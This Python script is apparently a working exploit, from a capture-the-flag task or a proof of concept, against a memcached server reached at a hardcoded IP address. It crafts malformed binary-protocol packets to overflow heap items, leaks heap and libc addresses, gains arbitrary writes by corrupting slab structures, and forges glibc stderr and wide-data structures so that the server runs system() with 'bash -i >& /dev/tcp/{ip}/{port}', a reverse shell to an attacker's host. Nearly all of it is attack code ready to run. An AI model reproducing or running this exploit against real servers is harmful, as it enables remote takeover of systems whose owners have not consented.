import struct
import socket
import sys
import pwn

p8 = lambda x: struct.pack("<B", x)
p16 = lambda x: struct.pack("<H", x)
p16b = lambda x: struct.pack(">H", x)
p32 = lambda x: struct.pack("<I", x)
p32b = lambda x: struct.pack(">I", x)
p64 = lambda x: struct.pack("<Q", x)

TARGET_IP = "101.43.232.7"

def send_msg(packet):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((TARGET_IP,int(sys.argv[3])))
	s.sendall(packet)
	res = s.recv(1024)
	s.close()
	return res

def quit_packet():
	MEMCACHED_REQUEST_MAGIC = b"\x80"
	OPCODE_QUIT = b"\x17"
	key_len = struct.pack("!H",0)
	body_len = struct.pack("!I",0)
	packet = MEMCACHED_REQUEST_MAGIC + OPCODE_QUIT + key_len +   body_len*2+b'A'*1024
	return packet

def get_packet(key):
	return b"get "+key+b"\r\n"

def set_packet(key, value):
	return b"set "+key+b" 0 9999 "+str(len(value)).encode()+b"\r\n"+value+b"\r\n"

def delete_packet(key):
	return b"delete "+key+b"\r\n"

def replace_packet(key, value):
	return b"replace "+key+b" 0 9999 "+str(len(value)).encode()+b"\r\n"+value+b"\r\n"

def getk(key):
	return send_msg(get_packet(key))

def setk(key, value):
	return send_msg(set_packet(key, value))

def deletek(key):
	return send_msg(delete_packet(key))

def replacek(key, value):
	return send_msg(replace_packet(key, value))

def gen_item_header(next, prev, h_next, time, exptime, nbytes,
	     refcount, nsuffix, it_flags, slabs_clsid, nkey):
	pay = b''
	pay+= struct.pack("<QQQIIIHBBBB", next, prev, h_next, time, exptime,
		   nbytes, refcount, nsuffix, it_flags, slabs_clsid, nkey)
	return pay

def evil_packet(keylen, body, bodylen=-1):
	if bodylen == -1:
		bodylen = len(body)-0x43
	if keylen > 0xfa:
		keylen = 0xfa
	MEMCACHED_REQUEST_MAGIC = b"\x80"
	OPCODE_PREPEND_Q = b"\x1a"
	key_len = struct.pack("!H",keylen)
	extra_len = b"\x00"
	data_type = b"\x00"
	vbucket = b"\x00\x00"
	body_len = struct.pack("!I", bodylen) # slab ntotal - 0x43
	opaque = struct.pack("!I",0)
	CAS = struct.pack("!Q",0)
	packet = MEMCACHED_REQUEST_MAGIC + OPCODE_PREPEND_Q + key_len + extra_len
	packet += data_type + vbucket + body_len + opaque + CAS
	packet += body
	return packet

arbw_klen = [0x28, 0x48, 0x68]
arbw_id = [0x2, 0x83, 0x84]
arbw_pad = [0x40, 0x60, 0x88]
arbw_cnt = 0
def arb_write(addr1, addr2):
	global arbw_cnt
	klen = arbw_klen[arbw_cnt]
	setk(b'A'*klen, b'A'*0x8)
	setk(b'B'*klen, b'B'*0x8)
	fake_item_header = gen_item_header(0,0,0,0x5d,0x2751,0x0101,1,3,0,arbw_id[arbw_cnt],klen)
	body = b"\x00"*arbw_pad[arbw_cnt]+fake_item_header
	body = body.ljust(rd_eight(body) ,b"\x00")
	body+= p64((arbw_cnt+1)*3+1)+b'B'*klen+b'\x00'+b'B'*0x8
	packet = evil_packet(len(body), body, klen+8)

	print(f"[+] start overflow {arbw_cnt}")
	
	send_msg(packet)
	pwn.sleep(1)
	res = getk(b'B'*klen)
	if not b'\x7f' in res:
		print("[!] fail")
		exit()
	
	fake_item_header = gen_item_header(addr1-8,addr2,0,0x5d,0x2751,0,1,3,0,arbw_id[arbw_cnt],klen)
	body = b"\x00"*arbw_pad[arbw_cnt]+fake_item_header
	body = body.ljust(rd_eight(body) ,b"\x00")
	body+= p64((arbw_cnt+1)*3+1)+b'B'*klen+b'\x00'+b'B'*0x8
	packet = evil_packet(len(body), body, klen+8)
	
	send_msg(packet)
	deletek(b'B'*klen)
	setk(b'C'*klen, b'A'*0x8)
	arbw_cnt+=1


def flush_all():
	return send_msg(b"flush_all\r\n")

def rd_eight(body):
	return (len(body) + 7) & -8

def attack(ip, port):
	libc = pwn.ELF('/lib/x86_64-linux-gnu/libc.so.6')
	target_c = b'\x23'
	setk(b'A', b'A'*0x8)
	setk(target_c, b'B'*0x8)

	fake_item_header = gen_item_header(0,0,0,0x3f,0x274d,0x0101,1,3,0,0x81,0x1)
	body = b"\x00"*0x28+fake_item_header
	body = body.ljust(rd_eight(body) ,b"\x00")
	body+= p64(0x2)+target_c+b'\x00'+b'B'*8
	packet1 = evil_packet(len(body), body, 0)

	print("[+] start leak")
	send_msg(packet1)
	res = getk(target_c)
	if (res == b''):
		print("[!] fail to leak")
		exit()
		
	ress = res[res.find(b'\r\n')+8+0x28:]
	heapaddr, = struct.unpack("<Q", ress[:8])
	heapbase = heapaddr-0xfff10
	leak_addr = heapbase+0x124000+0x7ff5b0+0x990

	print("[+] heap addr: "+hex(heapaddr))
	print("[+] heap base: "+hex(heapbase))
	print("[+] leak addr: "+hex(leak_addr))
	if heapbase&0xfff != 0:
		print("[!] fail")
		exit()


	########################### set fake item ###########################
	arb_write(leak_addr-8, leak_addr&~0xffff|0x0101)
	arb_write(leak_addr-0x15, leak_addr)
	########################### set fake item ###########################
	
	########################### change h_next ###########################

	fake_item_header = gen_item_header(0,0,leak_addr-0x30,0x3f,0x274d,0x0101,1,3,0,0x81,0x1)
	body = b"\x00"*0x28+fake_item_header
	body = body.ljust(rd_eight(body) ,b"\x00")
	body+= p64(0x2)+b'A'+b'\x00'+b'B'*8
	packet4 = evil_packet(len(body), body, 0)
	print("[+] change h_next")
	send_msg(packet4)

	########################### change h_next ###########################

	res = getk(target_c)
	ress = res[res.find(b'\r\n')+8+8:]
	#print(res)
	if not b'\x7f' in ress or (not b'\x55' in ress and not b'\x56' in ress):
		print("[!] fail to leak")
		exit()
	base = 0
	for i in range(10):
		a, = struct.unpack("<Q", ress[i*8:(i+1)*8])
		if (a>>40)&0xf0 == 0x50: # base
			if base == 0 and a&0xfff == 0xc80:
				base = a-0x6bc80
			elif base == 0 and a&0xfff == 0xcc0:
				base = a-0x6bcc0
			elif base == 0 and a&0xfff == 0xe41:
				base = a-0x11e41
			elif base == 0 and a&0xfff == 0xcd0:
				base = a-0x6bcd0
			elif base == 0 and a&0xfff == 0xec0:
				base = a-0x65ec0
				
		if (a>>40)&0xf0 == 0x70: # libc
			if libc.address==0 and a&0xfff == 0x720:
				libc.address = a-0x93720
			elif libc.address==0 and a&0xfff == 0x848:
				libc.address = a-0x9b848
			elif libc.address==0 and a&0xfff == 0x7f8:
				libc.address = a-0x9b7f8
	
	print("[+] base addr: "+hex(base))
	print("[+] libc base: "+hex(libc.address))
	if base == 0 or libc.address == 0 or base&0xfff!=0 or libc.address&0xfff!=0:
		print("[!] fail to leak")
		exit()

	########################### hijack slabslot ###########################
	setk(b'A'*8, b'A'*0xa0)
	slabslot5 = base+0x55d90
	slabclass = base+0x55cc0
	arb_write(base+0x55cd0, slabslot5)
	fake_slabclass4= p64(0x00001111000000f0)
	fake_slabclass4+= p64(slabclass+0x118-0x40)
	fake_slabclass4+= p64(0x0000000100001110)
	fake_slabclass4+= p64(leak_addr&~0xfff)
	fake_slabclass4+= p64(0x0000000000000010)
	fake_slabclass = b'\x00'*0x57+fake_slabclass4
	setk(b'Z'*8, fake_slabclass.ljust(0xa0, b'\x00'))

	fake_wd_addr = heapaddr+0x5000
	print("[+] fake wd addr: "+hex(fake_wd_addr))
	fake_slabclass7= p64(0x00000aaa00000180)
	fake_slabclass7+= p64(libc.sym['_IO_2_1_stderr_']-0x38-2)
	fake_slabclass7+= p64(0x0000000100000aa9)
	fake_slabclass7+= p64(leak_addr&~0xfff)
	fake_slabclass7+= p64(0x0000000000000010)
	fake_slabclass8= p64(0x00000888000001e0)
	fake_slabclass8+= p64(fake_wd_addr-0x38)
	fake_slabclass8+= p64(0x0000000100000887)
	fake_slabclass8+= p64(leak_addr&~0xfff)
	fake_slabclass8+= p64(0x0000000000000010)
	fake_slabclass = b'\x00'*0x6+fake_slabclass7+fake_slabclass8
	setk(b'D', fake_slabclass.ljust(0xa0, b'\x01'))
	########################### hijack slabslot ###########################

	fake_widedata = b'\x00'*0xd8
	fake_widedata+= p64(fake_wd_addr+0xe0+0x18-0x68) # _wide_vtable
	fake_widedata+= p64(0)
	fake_widedata+= p64(0)
	fake_widedata+= p64(libc.sym['system'])
	setk(b'fakewda', fake_widedata.ljust(0x140, b'\x00'))

	fake_stderr = b''
	fake_stderr+= f' bash -i >& /dev/tcp/{ip}/{port} 0>&2'.encode().ljust(0x30, b'\x00')
	fake_stderr+= p64(0)# 0x30:'_IO_write_end',
	fake_stderr+= p64(0)# 0x38:'_IO_buf_base',
	fake_stderr+= p64(0)# 0x40:'_IO_buf_end',
	fake_stderr+= p64(leak_addr&~0xfff)# 0x48:'_IO_save_base',
	fake_stderr+= p64(0)# 0x50:'_IO_backup_base',
	fake_stderr+= p64(0)# 0x58:'_IO_save_end',
	fake_stderr+= p64(0)# 0x60:'_markers',
	fake_stderr+= p64(0)# 0x68:'_chain',
	fake_stderr+= p32(0)# 0x70:'_fileno',
	fake_stderr+= p32(0)# 0x74:'_flags2',
	fake_stderr+= p64(0)# 0x78:'_old_offset',
	fake_stderr+= p64(0)# 0x80:'_cur_column',0x82:'_vtable_offset',0x83:'_shortbuf',
	fake_stderr+= p64(libc.address+0x21ca60)# 0x88:'_lock',
	fake_stderr+= p64(0)# 0x90:'_offset',
	fake_stderr+= p64(0)# 0x98:'_codecvt',
	fake_stderr+= p64(fake_wd_addr)# 0xa0:'_wide_data',
	fake_stderr+= p64(0)# 0xa8:'_freeres_list',
	fake_stderr+= p64(0)# 0xb0:'_freeres_buf',
	fake_stderr+= p64(0)# 0xb8:'__pad5',
	fake_stderr+= p32(0)# 0xc0:'_mode',
	fake_stderr+= b'\x00'*0x14 # 0xc4:'_unused2',
	fake_stderr+= p64(libc.address+0x2170c0)# 0xd8:'vtable' #_IO_wfile_jumps
	setk(b'D', fake_stderr.ljust(0x100, b'\x02'))

	print("[+] Done")

if __name__ == '__main__':
	if len(sys.argv) < 4:
		print('[!] expect three args')
		exit()
	
	ip = sys.argv[1]
	port = sys.argv[2]
	attack(ip, port)
